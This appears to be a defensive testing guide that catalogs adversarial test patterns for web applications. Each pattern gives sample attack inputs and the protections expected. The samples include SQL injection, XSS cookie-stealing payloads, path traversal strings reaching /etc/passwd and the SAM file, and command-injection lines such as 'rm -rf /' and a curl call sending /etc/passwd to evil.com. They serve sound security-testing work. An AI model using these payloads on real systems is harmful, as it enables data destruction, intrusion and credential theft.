# Adversarial Test Patterns

A catalog of attack patterns, failure modes, and exploit scenarios for building adversarial regression tests. Each pattern represents a way systems break in production that standard happy-path testing misses.

## Pattern 1: Injection Attacks

Malicious input designed to escape intended context and execute unintended operations.

### SQL Injection

**Attack vector**: User input included in SQL queries without parameterization.

**Minimal scenarios**:
```
Input: "'; DROP TABLE users; --"
Input: "1 OR 1=1"
Input: "admin'--"
```

**What to test**:
- All form fields that become part of SQL queries
- Search fields, filter parameters, sort column names
- URL path parameters used in queries
- Batch import/CSV upload fields

**Expected protected behavior**:
- Parameterized queries prevent injection
- Input is escaped or rejected
- Error message does not reveal SQL structure

### XSS (Cross-Site Scripting)

**Attack vector**: User input rendered in HTML without sanitization.

**Minimal scenarios**:
```
Input: "<script>alert('xss')</script>"
Input: "<img src=x onerror=alert(1)>"
Input: "javascript:alert(document.cookie)"
```

**What to test**:
- User profile fields displayed to other users
- Comment/message fields
- Search terms reflected in results page
- File names displayed in UI

**Expected protected behavior**:
- HTML entities are escaped in output
- Content Security Policy headers prevent inline script execution
- User input is never rendered as raw HTML

### Command Injection

**Attack vector**: User input passed to shell commands.

**Minimal scenarios**:
```
Input: "file.txt; rm -rf /"
Input: "$(curl http://evil.com/steal?data=$(cat /etc/passwd))"
Input: "file.txt | cat /etc/shadow"
```

**What to test**:
- File processing pipelines that shell out to external tools
- Report generation using command-line tools
- Any `os.system()`, `subprocess.run(shell=True)`, or backtick execution

**Expected protected behavior**:
- Input is validated against allowlist (not blocklist)
- Shell execution uses array form (not string) to prevent interpretation
- Sandbox or containerization limits blast radius

## Pattern 2: Authentication and Authorization Bypass

Attempts to access resources or perform actions without proper credentials.

### Header Manipulation

**Attack vector**: Crafting HTTP headers to impersonate users or bypass auth checks.

**Minimal scenarios**:
- Send request with `X-Forwarded-For: 127.0.0.1` to bypass IP allowlist
- Send request with `X-User-ID: admin` hoping backend trusts the header
- Remove `Authorization` header and check if endpoint returns data
- Use expired JWT token that is not validated

**What to test**:
- Every API endpoint with authentication requirement
- Admin-only endpoints accessed with regular user token
- Endpoints that check user identity from headers vs session

**Expected protected behavior**:
- Server validates authentication on every request
- Authorization checked against server-side session, not client-supplied headers
- Expired/malformed tokens are rejected with 401

### Privilege Escalation

**Attack vector**: Accessing resources belonging to other users or higher permission levels.

**Minimal scenarios**:
- Change user ID in request body: `{"user_id": "other_user", "action": "delete"}`
- Access admin panel via direct URL without admin role
- Modify another user's record by changing the record ID in the API call
- Access tenant B's data while authenticated as tenant A

**What to test**:
- All CRUD operations with cross-user ID parameters
- Admin endpoints with non-admin tokens
- Multi-tenant data isolation

**Expected protected behavior**:
- Server verifies the authenticated user has permission for the specific resource
- Record-level access control (not just endpoint-level)
- Tenant isolation enforced at database query level

## Pattern 3: Path Traversal

Attempts to access files outside intended directories.

### File Upload/Download Traversal

**Attack vector**: Manipulating file paths to read or write outside intended directory.

**Minimal scenarios**:
```
Filename: "../../../etc/passwd"
Filename: "..\\..\\..\\windows\\system32\\config\\sam"
Filename: "....//....//etc/passwd"
Filename: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**What to test**:
- File upload endpoints (where is the file saved?)
- File download endpoints (what path is resolved?)
- Template or report generation using user-supplied filenames
- Log file viewers, config file editors

**Expected protected behavior**:
- Server resolves the canonical path and verifies it is within the allowed directory
- Path components like `..` are rejected or normalized
- URL-encoded path characters are decoded before validation
- Symlinks are resolved before access check

## Pattern 4: Invalid State Transitions

Attempts to move a resource into an invalid state by skipping or reversing workflow steps.

### State Machine Violations

**Attack vector**: Directly calling APIs to set state without following the expected workflow.

**Minimal scenarios**:
- Call "approve" API on a draft that was never submitted for review
- Call "complete" API on an order that was already cancelled
- Call "reopen" API on a task that was already archived
- Submit a payment for a zero-balance invoice

**What to test**:
- Every state transition API endpoint
- State transitions from terminal states (completed, cancelled, archived)
- Parallel state transitions (two users approving simultaneously)
- Backward transitions (unapprove, unreject)

**Expected protected behavior**:
- Server validates current state before applying transition
- Invalid transitions return clear error (not silent success)
- State machine rules are enforced server-side, not just in UI
- Audit log records attempted invalid transitions

### Workflow Bypass

**Attack vector**: Skipping mandatory steps in a multi-step process.

**Minimal scenarios**:
- Submit form step 3 without completing steps 1 and 2
- Call final approval API without prerequisite reviews
- Upload document without passing validation check
- Deploy to production without staging verification

**What to test**:
- Multi-step forms submitted out of order
- Approval chains with missing intermediate approvals
- Sequential processes where steps are skipped

**Expected protected behavior**:
- Server tracks workflow progress independently of client state
- Each step validates prerequisites are complete
- Mandatory steps cannot be bypassed via direct API calls

## Pattern 5: Duplicate and Idempotency Violations

Failures caused by repeated submissions or duplicate processing.

### Double Submission

**Attack vector**: User clicks submit twice, or network retry sends duplicate requests.

**Minimal scenarios**:
- Click "Submit Order" rapidly 5 times -> 5 orders created?
- Network timeout causes retry -> duplicate payment processed?
- Browser back button + resubmit -> duplicate record?
- Concurrent API calls with same data -> duplicate entries?

**What to test**:
- All create/submit endpoints under rapid successive calls
- Payment processing with simulated network retries
- Form resubmission after browser back navigation
- API calls with identical idempotency keys

**Expected protected behavior**:
- Idempotency key prevents duplicate processing
- Database unique constraints catch duplicate records
- UI disables submit button after first click
- Retry-safe endpoints return same result for duplicate requests

### Race Condition in Concurrent Access

**Attack vector**: Multiple processes reading and writing the same data simultaneously.

**Minimal scenarios**:
- Two users edit the same record simultaneously -> last write wins, first user's changes lost
- Inventory count: read 5, two processes decrement, result should be 3 but shows 4
- Balance transfer: concurrent debit and credit produce incorrect final balance

**What to test**:
- Concurrent writes to shared resources (use threading or parallel test execution)
- Optimistic locking implementation (version column checked on update)
- Database-level locking for critical sections
- Queue processing with multiple consumers

**Expected protected behavior**:
- Optimistic or pessimistic locking prevents lost updates
- Conflict detection returns clear error to user
- Retry mechanism handles conflicts gracefully
- Atomic operations used for counters and balances

## Pattern 6: Stale Write and Optimistic Locking

Failures caused by writing data based on outdated reads.

### Lost Update Problem

**Attack vector**: System reads data, user makes changes, another user updates the same data, first user's write overwrites second user's changes.

**Minimal scenarios**:
1. User A reads record (version 1)
2. User B reads record (version 1)
3. User B updates record (now version 2)
4. User A updates record using version 1 data -> overwrites User B's changes

**What to test**:
- All update operations on shared resources
- Long-duration edit sessions (user opens form, waits 30 minutes, submits)
- Batch update operations that may conflict with individual updates

**Expected protected behavior**:
- Version column (or ETag) checked on update
- Stale write rejected with conflict error
- User informed of conflict with option to merge or retry
- Audit trail shows both versions

## Pattern 7: Fake Success Without Write

The most insidious pattern: the system reports success but data is not actually persisted.

### Silent Write Failures

**Attack vector**: Application swallows exceptions, shows success UI, but database operation failed.

**Minimal scenarios**:
- API returns 200 but transaction was rolled back due to constraint violation
- UI shows "Saved successfully" but write was to a disconnected session
- Async write queued but queue is full/down; no error propagated to caller
- Cache updated but database write failed; system shows cached (stale) data

**What to test**:
- Every save operation: verify by reading back from the database (not cache)
- Trigger constraint violations (unique, foreign key, check) and verify error is surfaced
- Simulate database connection failure during write and verify error handling
- Verify async write completion (not just queue acceptance)

**Expected protected behavior**:
- Write operations verify success by reading back from the database
- Transaction rollbacks propagate as user-visible errors
- Async operations have delivery guarantees and failure notifications
- No success message displayed until write is confirmed

**Testing pattern**:
```
1. Perform save operation
2. Assert: API returns success
3. Open new database connection (not same session)
4. Assert: Data exists in database with correct values
5. Assert: Related records (audit log, history) also exist
```

## Pattern 8: Import and Dependency Mismatch

Failures caused by differences between development and production runtime environments.

### Import Failures in Production

**Attack vector**: Code imports a module that exists in development but is missing in the production container.

**Minimal scenarios**:
- `import cv2` works locally (Homebrew installed) but fails in production container
- `from PIL import Image` works in dev but `Pillow` not in `requirements.txt`
- `import pandas` works in dev but production has memory constraint; import succeeds but OOM on large data
- Conditional import with fallback that silently degrades functionality

**What to test**:
- Run import smoke test for every production module in a clean container
- Verify `requirements.txt` / `package.json` includes all modules imported in source code
- Test conditional imports with both the primary and fallback paths

**Expected protected behavior**:
- All imports verified during packaging/build stage
- Missing dependencies caught before deployment
- Conditional imports logged when using fallback
- Requirements file maintained as single source of truth for dependencies

### Version Mismatch

**Attack vector**: Development uses a different version of a library than production, causing behavior differences.

**Minimal scenarios**:
- `pandas` 1.x vs 2.x: `DataFrame.append()` removed in 2.x
- `requests` with vs without `urllib3` version pinning
- `numpy` behavior differences across major versions
- ORM version differences causing query generation changes

**What to test**:
- Pin all dependency versions in lockfile
- Run tests with exact pinned versions (not compatible ranges)
- Test after dependency updates before releasing

**Expected protected behavior**:
- Lockfile committed and used in CI and production
- Dependency update is a separate, tested change
- Version compatibility tested before merge

## Building Adversarial Tests from These Patterns

For each pattern applicable to your system:

1. **Identify entry points**: Where can this pattern manifest in your application?
2. **Create minimal scenario**: What is the smallest test that demonstrates the vulnerability?
3. **Define expected behavior**: What should the system do when this pattern is attempted?
4. **Determine test tier**: Unit (for input validation), Integration (for DB/service), E2E (for workflow), Smoke (for critical paths)
5. **Add to regression backlog**: Use `assets/adversarial_regression_template.md`
